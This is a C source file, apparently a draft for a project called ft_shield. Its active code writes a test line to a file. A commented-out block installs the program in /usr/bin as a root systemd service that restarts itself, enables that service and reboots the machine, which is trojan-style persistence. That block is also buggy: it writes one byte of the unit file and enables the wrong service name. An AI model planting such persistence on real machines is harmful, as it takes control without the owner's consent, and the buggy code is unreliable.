/*
#include <stdlib.h>
#include <stdio.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdbool.h>
#include <fcntl.h>
#include <sys/reboot.h>
#include <string.h>

#define BUFFER_SIZE 1024
#define FT_SHIELD_SERVICE_PATH "/etc/systemd/system/ft_shield.service"

bool has_root_privileges() {
    return (geteuid() == 0);
}

int main(void) {
    umask(0);
    if (!has_root_privileges()) {
        printf("ft_shield needs root privileges\n");
        return (EXIT_FAILURE);
    }
    const char *persistance = "systemctl enable myservice";
    const char *p = "[Unit]\nDescription=My service\nAfter=network.target\n[Service]\nExecStart=/usr/bin/ft_shield\nRestart=always\nUser=root\n[Install]\nWantedBy=multi-user.target\n";

    pid_t pid = fork();
    if (pid > 0) {
        char *buffer = malloc(sizeof(char) * BUFFER_SIZE);
        if (buffer == NULL) {
            return 1;
        }
        size_t buffer_size = BUFFER_SIZE;
        getlogin_r(buffer, buffer_size);
        printf("Login: %s\n", buffer);
        exit(EXIT_SUCCESS);
    } else if (pid < 0) {
        return 1;
    } else {
        printf("we are here init it\n");
        int ret = system("gcc ./main.c -o ft_shield");
        if (ret != 0) {
            printf("went wrong\n");
            return 1;
        }
        ret = system("mv ft_shield /usr/bin/");
        if (ret != 0) {
            printf("went wrong\n");
            return 1;
        }
        int fd = open(FT_SHIELD_SERVICE_PATH, O_CREAT | O_WRONLY, 0644);
        if (fd < 0) {
            printf("went wrong\n");
            return -1;
        }
        write(fd, p, sizeof(*p));
        ret = system(persistance);
        if (ret != 0) {
            printf("went wrong\n");
            return 1;
        }
        if (reboot(RB_AUTOBOOT) != 0)
            return 1;
    }
}
*/
#include <fcntl.h>
#include <unistd.h>

int main(void)
{
    int fd = open("/home/yzioual/Desktop/ft_shield_test_file.txt", O_CREAT | O_WRONLY, 0644);
    if (fd < 0) {
        return -1;
    }
    write(fd, "hello\n", 6);
    close(fd);
    return 0;
}
